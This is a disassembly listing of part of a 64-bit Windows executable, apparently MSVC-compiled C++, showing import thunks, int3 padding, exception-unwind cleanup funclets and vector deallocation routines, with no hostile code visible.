   140009616:	5f                   	pop    %rdi
   140009617:	c3                   	ret
   140009618:	cc                   	int3
   140009619:	cc                   	int3
   14000961a:	cc                   	int3
   14000961b:	cc                   	int3
   14000961c:	cc                   	int3
   14000961d:	cc                   	int3
   14000961e:	cc                   	int3
   14000961f:	cc                   	int3
   140009620:	ff 25 32 0d 00 00    	jmp    *0xd32(%rip)        # 0x14000a358
   140009626:	ff 25 24 0d 00 00    	jmp    *0xd24(%rip)        # 0x14000a350
   14000962c:	ff 25 ee 0c 00 00    	jmp    *0xcee(%rip)        # 0x14000a320
   140009632:	ff 25 10 0d 00 00    	jmp    *0xd10(%rip)        # 0x14000a348
   140009638:	ff 25 3a 0d 00 00    	jmp    *0xd3a(%rip)        # 0x14000a378
   14000963e:	ff 25 fc 0c 00 00    	jmp    *0xcfc(%rip)        # 0x14000a340
   140009644:	ff 25 ee 0c 00 00    	jmp    *0xcee(%rip)        # 0x14000a338
   14000964a:	ff 25 10 0d 00 00    	jmp    *0xd10(%rip)        # 0x14000a360
   140009650:	ff 25 da 0c 00 00    	jmp    *0xcda(%rip)        # 0x14000a330
   140009656:	ff 25 cc 0c 00 00    	jmp    *0xccc(%rip)        # 0x14000a328
   14000965c:	ff 25 b6 0c 00 00    	jmp    *0xcb6(%rip)        # 0x14000a318
   140009662:	ff 25 00 0d 00 00    	jmp    *0xd00(%rip)        # 0x14000a368
   140009668:	ff 25 ba 0e 00 00    	jmp    *0xeba(%rip)        # 0x14000a528
   14000966e:	ff 25 c4 0e 00 00    	jmp    *0xec4(%rip)        # 0x14000a538
   140009674:	ff 25 4e 0d 00 00    	jmp    *0xd4e(%rip)        # 0x14000a3c8
   14000967a:	ff 25 30 0d 00 00    	jmp    *0xd30(%rip)        # 0x14000a3b0
   140009680:	ff 25 32 0d 00 00    	jmp    *0xd32(%rip)        # 0x14000a3b8
   140009686:	ff 25 6c 0d 00 00    	jmp    *0xd6c(%rip)        # 0x14000a3f8
   14000968c:	ff 25 fe 0d 00 00    	jmp    *0xdfe(%rip)        # 0x14000a490
   140009692:	ff 25 70 0d 00 00    	jmp    *0xd70(%rip)        # 0x14000a408
   140009698:	ff 25 72 0d 00 00    	jmp    *0xd72(%rip)        # 0x14000a410
   14000969e:	ff 25 74 0d 00 00    	jmp    *0xd74(%rip)        # 0x14000a418
   1400096a4:	ff 25 76 0d 00 00    	jmp    *0xd76(%rip)        # 0x14000a420
   1400096aa:	ff 25 78 0d 00 00    	jmp    *0xd78(%rip)        # 0x14000a428
   1400096b0:	ff 25 7a 0d 00 00    	jmp    *0xd7a(%rip)        # 0x14000a430
   1400096b6:	ff 25 2c 0d 00 00    	jmp    *0xd2c(%rip)        # 0x14000a3e8
   1400096bc:	ff 25 7e 0d 00 00    	jmp    *0xd7e(%rip)        # 0x14000a440
   1400096c2:	ff 25 80 0d 00 00    	jmp    *0xd80(%rip)        # 0x14000a448
   1400096c8:	ff 25 82 0d 00 00    	jmp    *0xd82(%rip)        # 0x14000a450
   1400096ce:	ff 25 84 0d 00 00    	jmp    *0xd84(%rip)        # 0x14000a458
   1400096d4:	ff 25 86 0d 00 00    	jmp    *0xd86(%rip)        # 0x14000a460
   1400096da:	ff 25 d0 0d 00 00    	jmp    *0xdd0(%rip)        # 0x14000a4b0
   1400096e0:	ff 25 8a 0d 00 00    	jmp    *0xd8a(%rip)        # 0x14000a470
   1400096e6:	ff 25 8c 0d 00 00    	jmp    *0xd8c(%rip)        # 0x14000a478
   1400096ec:	ff 25 8e 0d 00 00    	jmp    *0xd8e(%rip)        # 0x14000a480
   1400096f2:	ff 25 90 0d 00 00    	jmp    *0xd90(%rip)        # 0x14000a488
   1400096f8:	ff 25 da 0c 00 00    	jmp    *0xcda(%rip)        # 0x14000a3d8
   1400096fe:	ff 25 bc 0c 00 00    	jmp    *0xcbc(%rip)        # 0x14000a3c0
   140009704:	ff 25 9e 0d 00 00    	jmp    *0xd9e(%rip)        # 0x14000a4a8
   14000970a:	ff 25 28 0d 00 00    	jmp    *0xd28(%rip)        # 0x14000a438
   140009710:	cc                   	int3
   140009711:	cc                   	int3
   140009712:	cc                   	int3
   140009713:	cc                   	int3
   140009714:	cc                   	int3
   140009715:	cc                   	int3
   140009716:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000971d:	00 00 00 
   140009720:	ff e0                	jmp    *%rax
   140009722:	cc                   	int3
   140009723:	cc                   	int3
   140009724:	cc                   	int3
   140009725:	cc                   	int3
   140009726:	cc                   	int3
   140009727:	cc                   	int3
   140009728:	cc                   	int3
   140009729:	cc                   	int3
   14000972a:	cc                   	int3
   14000972b:	cc                   	int3
   14000972c:	cc                   	int3
   14000972d:	cc                   	int3
   14000972e:	cc                   	int3
   14000972f:	cc                   	int3
   140009730:	cc                   	int3
   140009731:	cc                   	int3
   140009732:	cc                   	int3
   140009733:	cc                   	int3
   140009734:	cc                   	int3
   140009735:	cc                   	int3
   140009736:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000973d:	00 00 00 
   140009740:	ff 25 2a 0e 00 00    	jmp    *0xe2a(%rip)        # 0x14000a570
   140009746:	cc                   	int3
   140009747:	cc                   	int3
   140009748:	cc                   	int3
   140009749:	cc                   	int3
   14000974a:	cc                   	int3
   14000974b:	cc                   	int3
   14000974c:	cc                   	int3
   14000974d:	cc                   	int3
   14000974e:	cc                   	int3
   14000974f:	cc                   	int3
   140009750:	48 8d 8a 20 00 00 00 	lea    0x20(%rdx),%rcx
   140009757:	e9 64 84 ff ff       	jmp    0x140001bc0
   14000975c:	cc                   	int3
   14000975d:	cc                   	int3
   14000975e:	cc                   	int3
   14000975f:	cc                   	int3
   140009760:	48 8d 8a 20 00 00 00 	lea    0x20(%rdx),%rcx
   140009767:	e9 04 84 ff ff       	jmp    0x140001b70
   14000976c:	cc                   	int3
   14000976d:	cc                   	int3
   14000976e:	cc                   	int3
   14000976f:	cc                   	int3
   140009770:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140009775:	55                   	push   %rbp
   140009776:	48 83 ec 20          	sub    $0x20,%rsp
   14000977a:	48 8b ea             	mov    %rdx,%rbp
   14000977d:	48 8b 55 60          	mov    0x60(%rbp),%rdx
   140009781:	48 8b 02             	mov    (%rdx),%rax
   140009784:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140009788:	48 03 ca             	add    %rdx,%rcx
   14000978b:	41 b0 01             	mov    $0x1,%r8b
   14000978e:	ba 04 00 00 00       	mov    $0x4,%edx
   140009793:	ff 15 0f 0b 00 00    	call   *0xb0f(%rip)        # 0x14000a2a8
   140009799:	90                   	nop
   14000979a:	48 b8 00 00 00 00 00 	movabs $0x0,%rax
   1400097a1:	00 00 00 
   1400097a4:	48 83 c4 20          	add    $0x20,%rsp
   1400097a8:	5d                   	pop    %rbp
   1400097a9:	c3                   	ret
   1400097aa:	cc                   	int3
   1400097ab:	cc                   	int3
   1400097ac:	cc                   	int3
   1400097ad:	cc                   	int3
   1400097ae:	cc                   	int3
   1400097af:	cc                   	int3
   1400097b0:	48 8d 8a 28 01 00 00 	lea    0x128(%rdx),%rcx
   1400097b7:	e9 74 82 ff ff       	jmp    0x140001a30
   1400097bc:	cc                   	int3
   1400097bd:	cc                   	int3
   1400097be:	cc                   	int3
   1400097bf:	cc                   	int3
   1400097c0:	48 8d 8a 08 01 00 00 	lea    0x108(%rdx),%rcx
   1400097c7:	e9 64 82 ff ff       	jmp    0x140001a30
   1400097cc:	cc                   	int3
   1400097cd:	cc                   	int3
   1400097ce:	cc                   	int3
   1400097cf:	cc                   	int3
   1400097d0:	48 8d 8a d8 00 00 00 	lea    0xd8(%rdx),%rcx
   1400097d7:	e9 84 83 ff ff       	jmp    0x140001b60
   1400097dc:	cc                   	int3
   1400097dd:	cc                   	int3
   1400097de:	cc                   	int3
   1400097df:	cc                   	int3
   1400097e0:	48 8d 8a 80 00 00 00 	lea    0x80(%rdx),%rcx
   1400097e7:	e9 e4 82 ff ff       	jmp    0x140001ad0
   1400097ec:	cc                   	int3
   1400097ed:	cc                   	int3
   1400097ee:	cc                   	int3
   1400097ef:	cc                   	int3
   1400097f0:	48 8d 8a a8 00 00 00 	lea    0xa8(%rdx),%rcx
   1400097f7:	e9 44 82 ff ff       	jmp    0x140001a40
   1400097fc:	cc                   	int3
   1400097fd:	cc                   	int3
   1400097fe:	cc                   	int3
   1400097ff:	cc                   	int3
   140009800:	40 55                	rex push %rbp
   140009802:	48 83 ec 20          	sub    $0x20,%rsp
   140009806:	48 8b ea             	mov    %rdx,%rbp
   140009809:	8b 45 38             	mov    0x38(%rbp),%eax
   14000980c:	83 e0 01             	and    $0x1,%eax
   14000980f:	85 c0                	test   %eax,%eax
   140009811:	74 0d                	je     0x140009820
   140009813:	83 65 38 fe          	andl   $0xfffffffe,0x38(%rbp)
   140009817:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   14000981b:	e8 10 82 ff ff       	call   0x140001a30
   140009820:	48 83 c4 20          	add    $0x20,%rsp
   140009824:	5d                   	pop    %rbp
   140009825:	c3                   	ret
   140009826:	cc                   	int3
   140009827:	cc                   	int3
   140009828:	cc                   	int3
   140009829:	cc                   	int3
   14000982a:	cc                   	int3
   14000982b:	cc                   	int3
   14000982c:	cc                   	int3
   14000982d:	cc                   	int3
   14000982e:	cc                   	int3
   14000982f:	cc                   	int3
   140009830:	48 8d 8a 48 01 00 00 	lea    0x148(%rdx),%rcx
   140009837:	e9 f4 81 ff ff       	jmp    0x140001a30
   14000983c:	cc                   	int3
   14000983d:	cc                   	int3
   14000983e:	cc                   	int3
   14000983f:	cc                   	int3
   140009840:	40 55                	rex push %rbp
   140009842:	48 83 ec 20          	sub    $0x20,%rsp
   140009846:	48 8b ea             	mov    %rdx,%rbp
   140009849:	8b 45 38             	mov    0x38(%rbp),%eax
   14000984c:	83 e0 04             	and    $0x4,%eax
   14000984f:	85 c0                	test   %eax,%eax
   140009851:	74 0d                	je     0x140009860
   140009853:	83 65 38 fb          	andl   $0xfffffffb,0x38(%rbp)
   140009857:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   14000985b:	e8 d0 81 ff ff       	call   0x140001a30
   140009860:	48 83 c4 20          	add    $0x20,%rsp
   140009864:	5d                   	pop    %rbp
   140009865:	c3                   	ret
   140009866:	cc                   	int3
   140009867:	cc                   	int3
   140009868:	cc                   	int3
   140009869:	cc                   	int3
   14000986a:	cc                   	int3
   14000986b:	cc                   	int3
   14000986c:	cc                   	int3
   14000986d:	cc                   	int3
   14000986e:	cc                   	int3
   14000986f:	cc                   	int3
   140009870:	40 55                	rex push %rbp
   140009872:	48 83 ec 20          	sub    $0x20,%rsp
   140009876:	48 8b ea             	mov    %rdx,%rbp
   140009879:	8b 45 38             	mov    0x38(%rbp),%eax
   14000987c:	83 e0 10             	and    $0x10,%eax
   14000987f:	85 c0                	test   %eax,%eax
   140009881:	74 0d                	je     0x140009890
   140009883:	83 65 38 ef          	andl   $0xffffffef,0x38(%rbp)
   140009887:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   14000988b:	e8 a0 81 ff ff       	call   0x140001a30
   140009890:	48 83 c4 20          	add    $0x20,%rsp
   140009894:	5d                   	pop    %rbp
   140009895:	c3                   	ret
   140009896:	cc                   	int3
   140009897:	cc                   	int3
   140009898:	cc                   	int3
   140009899:	cc                   	int3
   14000989a:	cc                   	int3
   14000989b:	cc                   	int3
   14000989c:	cc                   	int3
   14000989d:	cc                   	int3
   14000989e:	cc                   	int3
   14000989f:	cc                   	int3
   1400098a0:	48 8d 8a 38 01 00 00 	lea    0x138(%rdx),%rcx
   1400098a7:	e9 84 81 ff ff       	jmp    0x140001a30
   1400098ac:	cc                   	int3
   1400098ad:	cc                   	int3
   1400098ae:	cc                   	int3
   1400098af:	cc                   	int3
   1400098b0:	48 8d 8a 48 00 00 00 	lea    0x48(%rdx),%rcx
   1400098b7:	e9 a4 82 ff ff       	jmp    0x140001b60
   1400098bc:	cc                   	int3
   1400098bd:	cc                   	int3
   1400098be:	cc                   	int3
   1400098bf:	cc                   	int3
   1400098c0:	48 8d 8a 70 02 00 00 	lea    0x270(%rdx),%rcx
   1400098c7:	e9 94 82 ff ff       	jmp    0x140001b60
   1400098cc:	cc                   	int3
   1400098cd:	cc                   	int3
   1400098ce:	cc                   	int3
   1400098cf:	cc                   	int3
   1400098d0:	48 8d 8a 40 00 00 00 	lea    0x40(%rdx),%rcx
   1400098d7:	e9 54 81 ff ff       	jmp    0x140001a30
   1400098dc:	cc                   	int3
   1400098dd:	cc                   	int3
   1400098de:	cc                   	int3
   1400098df:	cc                   	int3
   1400098e0:	48 8d 8a 30 00 00 00 	lea    0x30(%rdx),%rcx
   1400098e7:	e9 04 9f ff ff       	jmp    0x1400037f0
   1400098ec:	cc                   	int3
   1400098ed:	cc                   	int3
   1400098ee:	cc                   	int3
   1400098ef:	cc                   	int3
   1400098f0:	48 8d 8a 48 00 00 00 	lea    0x48(%rdx),%rcx
   1400098f7:	e9 74 9f ff ff       	jmp    0x140003870
   1400098fc:	cc                   	int3
   1400098fd:	cc                   	int3
   1400098fe:	cc                   	int3
   1400098ff:	cc                   	int3
   140009900:	48 8d 8a 48 00 00 00 	lea    0x48(%rdx),%rcx
   140009907:	e9 b4 82 ff ff       	jmp    0x140001bc0
   14000990c:	cc                   	int3
   14000990d:	cc                   	int3
   14000990e:	cc                   	int3
   14000990f:	cc                   	int3
   140009910:	48 8d 8a 70 00 00 00 	lea    0x70(%rdx),%rcx
   140009917:	e9 44 c2 ff ff       	jmp    0x140005b60
   14000991c:	cc                   	int3
   14000991d:	cc                   	int3
   14000991e:	cc                   	int3
   14000991f:	cc                   	int3
   140009920:	48 8d 8a 48 00 00 00 	lea    0x48(%rdx),%rcx
   140009927:	e9 44 82 ff ff       	jmp    0x140001b70
   14000992c:	cc                   	int3
   14000992d:	cc                   	int3
   14000992e:	cc                   	int3
   14000992f:	cc                   	int3
   140009930:	48 8d 8a e8 00 00 00 	lea    0xe8(%rdx),%rcx
   140009937:	48 ff 25 ca 07 00 00 	rex.W jmp *0x7ca(%rip)        # 0x14000a108
   14000993e:	cc                   	int3
   14000993f:	cc                   	int3
   140009940:	48 8d 8a e0 00 00 00 	lea    0xe0(%rdx),%rcx
   140009947:	e9 f4 c1 ff ff       	jmp    0x140005b40
   14000994c:	cc                   	int3
   14000994d:	cc                   	int3
   14000994e:	cc                   	int3
   14000994f:	cc                   	int3
   140009950:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140009955:	55                   	push   %rbp
   140009956:	48 83 ec 40          	sub    $0x40,%rsp
   14000995a:	48 8b ea             	mov    %rdx,%rbp
   14000995d:	48 8b 95 d0 00 00 00 	mov    0xd0(%rbp),%rdx
   140009964:	48 8b 02             	mov    (%rdx),%rax
   140009967:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000996b:	48 03 ca             	add    %rdx,%rcx
   14000996e:	41 b0 01             	mov    $0x1,%r8b
   140009971:	ba 04 00 00 00       	mov    $0x4,%edx
   140009976:	ff 15 2c 09 00 00    	call   *0x92c(%rip)        # 0x14000a2a8
   14000997c:	90                   	nop
   14000997d:	48 b8 00 00 00 00 00 	movabs $0x0,%rax
   140009984:	00 00 00 
   140009987:	48 83 c4 40          	add    $0x40,%rsp
   14000998b:	5d                   	pop    %rbp
   14000998c:	c3                   	ret
   14000998d:	cc                   	int3
   14000998e:	cc                   	int3
   14000998f:	cc                   	int3
   140009990:	48 8d 8a 48 00 00 00 	lea    0x48(%rdx),%rcx
   140009997:	48 ff 25 6a 07 00 00 	rex.W jmp *0x76a(%rip)        # 0x14000a108
   14000999e:	cc                   	int3
   14000999f:	cc                   	int3
   1400099a0:	48 8d 8a 40 00 00 00 	lea    0x40(%rdx),%rcx
   1400099a7:	e9 94 c1 ff ff       	jmp    0x140005b40
   1400099ac:	cc                   	int3
   1400099ad:	cc                   	int3
   1400099ae:	cc                   	int3
   1400099af:	cc                   	int3
   1400099b0:	40 55                	rex push %rbp
   1400099b2:	48 83 ec 20          	sub    $0x20,%rsp
   1400099b6:	48 8b ea             	mov    %rdx,%rbp
   1400099b9:	8b 45 40             	mov    0x40(%rbp),%eax
   1400099bc:	83 e0 01             	and    $0x1,%eax
   1400099bf:	85 c0                	test   %eax,%eax
   1400099c1:	74 18                	je     0x1400099db
   1400099c3:	83 65 40 fe          	andl   $0xfffffffe,0x40(%rbp)
   1400099c7:	48 8b 8d 90 00 00 00 	mov    0x90(%rbp),%rcx
   1400099ce:	48 81 c1 a8 00 00 00 	add    $0xa8,%rcx
   1400099d5:	ff 15 35 08 00 00    	call   *0x835(%rip)        # 0x14000a210
   1400099db:	48 83 c4 20          	add    $0x20,%rsp
   1400099df:	5d                   	pop    %rbp
   1400099e0:	c3                   	ret
   1400099e1:	cc                   	int3
   1400099e2:	cc                   	int3
   1400099e3:	cc                   	int3
   1400099e4:	cc                   	int3
   1400099e5:	cc                   	int3
   1400099e6:	cc                   	int3
   1400099e7:	cc                   	int3
   1400099e8:	cc                   	int3
   1400099e9:	cc                   	int3
   1400099ea:	cc                   	int3
   1400099eb:	cc                   	int3
   1400099ec:	cc                   	int3
   1400099ed:	cc                   	int3
   1400099ee:	cc                   	int3
   1400099ef:	cc                   	int3
   1400099f0:	48 8b 8a 90 00 00 00 	mov    0x90(%rdx),%rcx
   1400099f7:	48 83 c1 10          	add    $0x10,%rcx
   1400099fb:	48 ff 25 26 08 00 00 	rex.W jmp *0x826(%rip)        # 0x14000a228
   140009a02:	cc                   	int3
   140009a03:	cc                   	int3
   140009a04:	cc                   	int3
   140009a05:	cc                   	int3
   140009a06:	cc                   	int3
   140009a07:	cc                   	int3
   140009a08:	cc                   	int3
   140009a09:	cc                   	int3
   140009a0a:	cc                   	int3
   140009a0b:	cc                   	int3
   140009a0c:	cc                   	int3
   140009a0d:	cc                   	int3
   140009a0e:	cc                   	int3
   140009a0f:	cc                   	int3
   140009a10:	48 8b 8a 90 00 00 00 	mov    0x90(%rdx),%rcx
   140009a17:	48 83 c1 08          	add    $0x8,%rcx
   140009a1b:	e9 d0 bf ff ff       	jmp    0x1400059f0
   140009a20:	48 8d 8a 58 00 00 00 	lea    0x58(%rdx),%rcx
   140009a27:	e9 34 c1 ff ff       	jmp    0x140005b60
   140009a2c:	cc                   	int3
   140009a2d:	cc                   	int3
   140009a2e:	cc                   	int3
   140009a2f:	cc                   	int3
   140009a30:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140009a37:	e9 c4 c1 ff ff       	jmp    0x140005c00
   140009a3c:	cc                   	int3
   140009a3d:	cc                   	int3
   140009a3e:	cc                   	int3
   140009a3f:	cc                   	int3
   140009a40:	40 55                	rex push %rbp
   140009a42:	48 83 ec 20          	sub    $0x20,%rsp
   140009a46:	48 8b ea             	mov    %rdx,%rbp
   140009a49:	8b 45 20             	mov    0x20(%rbp),%eax
   140009a4c:	83 e0 02             	and    $0x2,%eax
   140009a4f:	85 c0                	test   %eax,%eax
   140009a51:	74 15                	je     0x140009a68
   140009a53:	83 65 20 fd          	andl   $0xfffffffd,0x20(%rbp)
   140009a57:	48 8d 4d 50          	lea    0x50(%rbp),%rcx
   140009a5b:	48 81 c1 88 00 00 00 	add    $0x88,%rcx
   140009a62:	ff 15 a8 07 00 00    	call   *0x7a8(%rip)        # 0x14000a210
   140009a68:	48 83 c4 20          	add    $0x20,%rsp
   140009a6c:	5d                   	pop    %rbp
   140009a6d:	c3                   	ret
   140009a6e:	cc                   	int3
   140009a6f:	cc                   	int3
   140009a70:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140009a77:	48 83 c1 10          	add    $0x10,%rcx
   140009a7b:	48 ff 25 a6 07 00 00 	rex.W jmp *0x7a6(%rip)        # 0x14000a228
   140009a82:	cc                   	int3
   140009a83:	cc                   	int3
   140009a84:	cc                   	int3
   140009a85:	cc                   	int3
   140009a86:	cc                   	int3
   140009a87:	cc                   	int3
   140009a88:	cc                   	int3
   140009a89:	cc                   	int3
   140009a8a:	cc                   	int3
   140009a8b:	cc                   	int3
   140009a8c:	cc                   	int3
   140009a8d:	cc                   	int3
   140009a8e:	cc                   	int3
   140009a8f:	cc                   	int3
   140009a90:	40 55                	rex push %rbp
   140009a92:	48 83 ec 20          	sub    $0x20,%rsp
   140009a96:	48 8b ea             	mov    %rdx,%rbp
   140009a99:	8b 45 20             	mov    0x20(%rbp),%eax
   140009a9c:	83 e0 08             	and    $0x8,%eax
   140009a9f:	85 c0                	test   %eax,%eax
   140009aa1:	74 10                	je     0x140009ab3
   140009aa3:	83 65 20 f7          	andl   $0xfffffff7,0x20(%rbp)
   140009aa7:	48 8b 8d 40 01 00 00 	mov    0x140(%rbp),%rcx
   140009aae:	e8 7d 7f ff ff       	call   0x140001a30
   140009ab3:	48 83 c4 20          	add    $0x20,%rsp
   140009ab7:	5d                   	pop    %rbp
   140009ab8:	c3                   	ret
   140009ab9:	cc                   	int3
   140009aba:	cc                   	int3
   140009abb:	cc                   	int3
   140009abc:	cc                   	int3
   140009abd:	cc                   	int3
   140009abe:	cc                   	int3
   140009abf:	cc                   	int3
   140009ac0:	48 8d 8a 58 00 00 00 	lea    0x58(%rdx),%rcx
   140009ac7:	e9 64 7f ff ff       	jmp    0x140001a30
   140009acc:	cc                   	int3
   140009acd:	cc                   	int3
   140009ace:	cc                   	int3
   140009acf:	cc                   	int3
   140009ad0:	48 8d 8a 30 00 00 00 	lea    0x30(%rdx),%rcx
   140009ad7:	e9 c4 c0 ff ff       	jmp    0x140005ba0
   140009adc:	cc                   	int3
   140009add:	cc                   	int3
   140009ade:	cc                   	int3
   140009adf:	cc                   	int3
   140009ae0:	48 8d 8a 60 01 00 00 	lea    0x160(%rdx),%rcx
   140009ae7:	e9 44 7f ff ff       	jmp    0x140001a30
   140009aec:	cc                   	int3
   140009aed:	cc                   	int3
   140009aee:	cc                   	int3
   140009aef:	cc                   	int3
   140009af0:	48 8d 8a 40 01 00 00 	lea    0x140(%rdx),%rcx
   140009af7:	e9 34 7f ff ff       	jmp    0x140001a30
   140009afc:	cc                   	int3
   140009afd:	cc                   	int3
   140009afe:	cc                   	int3
   140009aff:	cc                   	int3
   140009b00:	48 8d 8a 40 00 00 00 	lea    0x40(%rdx),%rcx
   140009b07:	e9 94 c0 ff ff       	jmp    0x140005ba0
   140009b0c:	cc                   	int3
   140009b0d:	cc                   	int3
   140009b0e:	cc                   	int3
   140009b0f:	cc                   	int3
   140009b10:	48 8d 8a 70 01 00 00 	lea    0x170(%rdx),%rcx
   140009b17:	e9 14 7f ff ff       	jmp    0x140001a30
   140009b1c:	cc                   	int3
   140009b1d:	cc                   	int3
   140009b1e:	cc                   	int3
   140009b1f:	cc                   	int3
   140009b20:	48 8d 8a 50 01 00 00 	lea    0x150(%rdx),%rcx
   140009b27:	e9 04 7f ff ff       	jmp    0x140001a30
   140009b2c:	40 55                	rex push %rbp
   140009b2e:	48 8b ea             	mov    %rdx,%rbp
   140009b31:	48 8b 01             	mov    (%rcx),%rax
   140009b34:	33 c9                	xor    %ecx,%ecx
   140009b36:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   140009b3c:	0f 94 c1             	sete   %cl
   140009b3f:	8b c1                	mov    %ecx,%eax
   140009b41:	5d                   	pop    %rbp
   140009b42:	c3                   	ret
   140009b43:	cc                   	int3
   140009b44:	40 55                	rex push %rbp
   140009b46:	48 83 ec 20          	sub    $0x20,%rsp
   140009b4a:	48 8b ea             	mov    %rdx,%rbp
   140009b4d:	48 8b d1             	mov    %rcx,%rdx
   140009b50:	48 8b 09             	mov    (%rcx),%rcx
   140009b53:	8b 09                	mov    (%rcx),%ecx
   140009b55:	e8 50 fb ff ff       	call   0x1400096aa
   140009b5a:	90                   	nop
   140009b5b:	48 83 c4 20          	add    $0x20,%rsp
   140009b5f:	5d                   	pop    %rbp
   140009b60:	c3                   	ret
   140009b61:	cc                   	int3
   140009b62:	cc                   	int3
   140009b63:	cc                   	int3
   140009b64:	cc                   	int3
   140009b65:	cc                   	int3
   140009b66:	cc                   	int3
   140009b67:	cc                   	int3
   140009b68:	cc                   	int3
   140009b69:	cc                   	int3
   140009b6a:	cc                   	int3
   140009b6b:	cc                   	int3
   140009b6c:	cc                   	int3
   140009b6d:	cc                   	int3
   140009b6e:	cc                   	int3
   140009b6f:	cc                   	int3
   140009b70:	48 8d 0d 99 84 00 00 	lea    0x8499(%rip),%rcx        # 0x140012010
   140009b77:	e9 04 81 ff ff       	jmp    0x140001c80
   140009b7c:	cc                   	int3
   140009b7d:	cc                   	int3
   140009b7e:	cc                   	int3
   140009b7f:	cc                   	int3
   140009b80:	48 83 ec 38          	sub    $0x38,%rsp
   140009b84:	4c 8b 05 25 94 00 00 	mov    0x9425(%rip),%r8        # 0x140012fb0
   140009b8b:	4d 85 c0             	test   %r8,%r8
   140009b8e:	0f 84 86 00 00 00    	je     0x140009c1a
   140009b94:	48 8b 0d 25 94 00 00 	mov    0x9425(%rip),%rcx        # 0x140012fc0
   140009b9b:	48 b8 67 66 66 66 66 	movabs $0x6666666666666667,%rax
   140009ba2:	66 66 66 
   140009ba5:	49 2b c8             	sub    %r8,%rcx
   140009ba8:	48 f7 e9             	imul   %rcx
   140009bab:	48 c1 fa 04          	sar    $0x4,%rdx
   140009baf:	48 8b c2             	mov    %rdx,%rax
   140009bb2:	48 c1 e8 3f          	shr    $0x3f,%rax
   140009bb6:	48 03 d0             	add    %rax,%rdx
   140009bb9:	49 8b c0             	mov    %r8,%rax
   140009bbc:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
   140009bc0:	48 c1 e2 03          	shl    $0x3,%rdx
   140009bc4:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140009bcb:	72 2f                	jb     0x140009bfc
   140009bcd:	4d 8b 40 f8          	mov    -0x8(%r8),%r8
   140009bd1:	48 83 c2 27          	add    $0x27,%rdx
   140009bd5:	49 2b c0             	sub    %r8,%rax
   140009bd8:	48 83 e8 08          	sub    $0x8,%rax
   140009bdc:	48 83 f8 1f          	cmp    $0x1f,%rax
   140009be0:	76 1a                	jbe    0x140009bfc
   140009be2:	45 33 c9             	xor    %r9d,%r9d
   140009be5:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140009bec:	00 00 
   140009bee:	45 33 c0             	xor    %r8d,%r8d
   140009bf1:	33 d2                	xor    %edx,%edx
   140009bf3:	33 c9                	xor    %ecx,%ecx
   140009bf5:	ff 15 6d 08 00 00    	call   *0x86d(%rip)        # 0x14000a468
   140009bfb:	cc                   	int3
   140009bfc:	49 8b c8             	mov    %r8,%rcx
   140009bff:	e8 d4 eb ff ff       	call   0x1400087d8
   140009c04:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009c07:	48 c7 05 9e 93 00 00 	movq   $0x0,0x939e(%rip)        # 0x140012fb0
   140009c0e:	00 00 00 00 
   140009c12:	f3 0f 7f 05 9e 93 00 	movdqu %xmm0,0x939e(%rip)        # 0x140012fb8
   140009c19:	00 
   140009c1a:	48 83 c4 38          	add    $0x38,%rsp
   140009c1e:	c3                   	ret
   140009c1f:	cc                   	int3
   140009c20:	48 83 ec 38          	sub    $0x38,%rsp
   140009c24:	4c 8b 05 9d 93 00 00 	mov    0x939d(%rip),%r8        # 0x140012fc8
   140009c2b:	4d 85 c0             	test   %r8,%r8
   140009c2e:	0f 84 86 00 00 00    	je     0x140009cba
   140009c34:	48 8b 0d 9d 93 00 00 	mov    0x939d(%rip),%rcx        # 0x140012fd8
   140009c3b:	48 b8 ab aa aa aa aa 	movabs $0x2aaaaaaaaaaaaaab,%rax
   140009c42:	aa aa 2a 
   140009c45:	49 2b c8             	sub    %r8,%rcx
   140009c48:	48 f7 e9             	imul   %rcx
   140009c4b:	48 c1 fa 02          	sar    $0x2,%rdx
   140009c4f:	48 8b c2             	mov    %rdx,%rax
   140009c52:	48 c1 e8 3f          	shr    $0x3f,%rax
   140009c56:	48 03 d0             	add    %rax,%rdx
   140009c59:	49 8b c0             	mov    %r8,%rax
   140009c5c:	48 8d 14 52          	lea    (%rdx,%rdx,2),%rdx
   140009c60:	48 c1 e2 03          	shl    $0x3,%rdx
   140009c64:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140009c6b:	72 2f                	jb     0x140009c9c
   140009c6d:	4d 8b 40 f8          	mov    -0x8(%r8),%r8
   140009c71:	48 83 c2 27          	add    $0x27,%rdx
   140009c75:	49 2b c0             	sub    %r8,%rax
   140009c78:	48 83 e8 08          	sub    $0x8,%rax
   140009c7c:	48 83 f8 1f          	cmp    $0x1f,%rax
   140009c80:	76 1a                	jbe    0x140009c9c
   140009c82:	45 33 c9             	xor    %r9d,%r9d
   140009c85:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140009c8c:	00 00 
   140009c8e:	45 33 c0             	xor    %r8d,%r8d
   140009c91:	33 d2                	xor    %edx,%edx
   140009c93:	33 c9                	xor    %ecx,%ecx
   140009c95:	ff 15 cd 07 00 00    	call   *0x7cd(%rip)        # 0x14000a468
   140009c9b:	cc                   	int3
   140009c9c:	49 8b c8             	mov    %r8,%rcx
   140009c9f:	e8 34 eb ff ff       	call   0x1400087d8
   140009ca4:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009ca7:	48 c7 05 16 93 00 00 	movq   $0x0,0x9316(%rip)        # 0x140012fc8
   140009cae:	00 00 00 00 
   140009cb2:	f3 0f 7f 05 16 93 00 	movdqu %xmm0,0x9316(%rip)        # 0x140012fd0
   140009cb9:	00 
   140009cba:	48 83 c4 38          	add    $0x38,%rsp
   140009cbe:	c3                   	ret
